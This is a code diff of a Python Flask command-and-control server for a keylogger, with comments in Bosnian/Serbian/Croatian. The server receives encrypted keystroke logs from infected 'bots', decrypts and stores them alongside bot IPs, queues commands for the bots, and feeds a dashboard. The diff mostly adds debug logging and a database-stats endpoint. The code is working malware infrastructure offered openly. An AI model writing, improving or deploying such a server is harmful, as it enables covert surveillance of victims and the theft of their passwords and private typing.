@@ -125,6 +125,7 @@ def get_all_bots():
         c.execute("SELECT bot_id, first_seen, last_seen, ip_address FROM bots")
         bots = [{"bot_id": row[0], "first_seen": row[1], "last_seen": row[2], "ip": row[3]} for row in c.fetchall()]
         conn.close()
+        print(f"[*] Returning {len(bots)} bots")
         return bots
     except Exception as e:
         print(f"[-] Error getting bots: {e}")
@@ -137,6 +138,7 @@ def get_recent_logs(limit=100):
         c.execute("SELECT bot_id, data, timestamp FROM keylogs ORDER BY id DESC LIMIT ?", (limit,))
         logs = [{"bot": row[0], "data": row[1], "time": row[2]} for row in c.fetchall()]
         conn.close()
+        print(f"[*] Returning {len(logs)} logs")
         return logs
     except Exception as e:
         print(f"[-] Error getting logs: {e}")
@@ -157,6 +159,7 @@ def receive_keylog():
         print("[*] ===== NEW KEYLOG REQUEST =====")
         data = request.get_json()
         if not data:
+            print("[-] No JSON data")
             return jsonify({"status": "error", "message": "No data"}), 400
         
         bot_id = data.get('id')
@@ -164,9 +167,11 @@ def receive_keylog():
         timestamp = data.get('timestamp', datetime.datetime.now().isoformat())
         
         print(f"[*] Bot ID: {bot_id}")
+        print(f"[*] Data length: {len(log_data)}")
         print(f"[*] Data: {log_data[:50]}...")
         
         if not bot_id or not log_data:
+            print("[-] Missing fields")
             return jsonify({"status": "error", "message": "Missing fields"}), 400
         
         # Dekodiraj
@@ -174,29 +179,44 @@ def receive_keylog():
         try:
             encrypted = base64.b64decode(log_data)
             decoded_log = cipher.decrypt(encrypted).decode('utf-8', errors='ignore')
-            print(f"[+] Decrypted: {decoded_log}")
+            print(f"[+] Decrypted: {decoded_log[:50]}...")
         except Exception as e:
             print(f"[-] Decryption error: {e}")
             try:
                 decoded_log = base64.b64decode(log_data).decode('utf-8', errors='ignore')
-                print(f"[+] Fallback: {decoded_log}")
+                print(f"[+] Fallback: {decoded_log[:50]}...")
             except:
                 decoded_log = str(log_data)
-                print(f"[+] Raw: {decoded_log}")
+                print(f"[+] Raw: {decoded_log[:50]}...")
         
         # SAČUVAJ U BAZU
-        print("[*] Saving to database...")
-        save_keylog(bot_id, decoded_log, timestamp)
+        print("[*] SAVING TO DATABASE...")
+        save_result = save_keylog(bot_id, decoded_log, timestamp)
+        print(f"[*] save_keylog result: {save_result}")
+        
         save_bot(bot_id, timestamp, request.remote_addr)
+        
+        # PROVJERI DA LI JE SAČUVANO
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            c = conn.cursor()
+            c.execute("SELECT COUNT(*) FROM keylogs")
+            count = c.fetchone()[0]
+            conn.close()
+            print(f"[*] Total logs in database: {count}")
+        except Exception as e:
+            print(f"[-] Error checking database: {e}")
         
         print(f"[+] ===== SUCCESS: Keylog from {bot_id} SAVED! =====")
         return jsonify({"status": "ok", "message": "Data received"}), 200
         
     except Exception as e:
-        print(f"[-] ERROR: {e}")
+        print(f"[-] ERROR in receive_keylog: {e}")
+        import traceback
+        traceback.print_exc()
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# ====== RUTA ZA KOMANDE - OVO JE FALILO! ======
+# ====== RUTA ZA KOMANDE ======
 @app.route('/command', methods=['GET'])
 @require_auth
 def get_command():
@@ -266,7 +286,7 @@ def api_bots():
         bots = get_all_bots()
         return jsonify({"bots": bots})
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f"[-] Error in api_bots: {e}")
         return jsonify({"bots": []}), 500
 
 @app.route('/api/logs', methods=['GET'])
@@ -276,7 +296,7 @@ def api_logs():
         logs = get_recent_logs(100)
         return jsonify({"logs": logs})
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f"[-] Error in api_logs: {e}")
         return jsonify({"logs": []}), 500
 
 @app.route('/api/commands', methods=['GET'])
@@ -289,7 +309,7 @@ def api_commands():
         conn.close()
         return jsonify({"commands": commands})
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f"[-] Error in api_commands: {e}")
         return jsonify({"commands": []}), 500
 
 @app.route('/api/send_command', methods=['POST'])
@@ -316,11 +336,29 @@ def api_send_command():
         return jsonify({"status": "ok", "command_id": command_id})
         
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f"[-] Error in api_send_command: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
+@app.route('/api/db_stats', methods=['GET'])
+def db_stats():
+    """Provjeri stanje baze"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("SELECT COUNT(*) FROM keylogs")
+        keylogs_count = c.fetchone()[0]
+        c.execute("SELECT COUNT(*) FROM bots")
+        bots_count = c.fetchone()[0]
+        conn.close()
+        return jsonify({
+            "keylogs": keylogs_count,
+            "bots": bots_count
+        })
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 # =====================================================================
-# DASHBOARD TEMPLATE (isti kao prije)
+# DASHBOARD TEMPLATE
 # =====================================================================
 DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
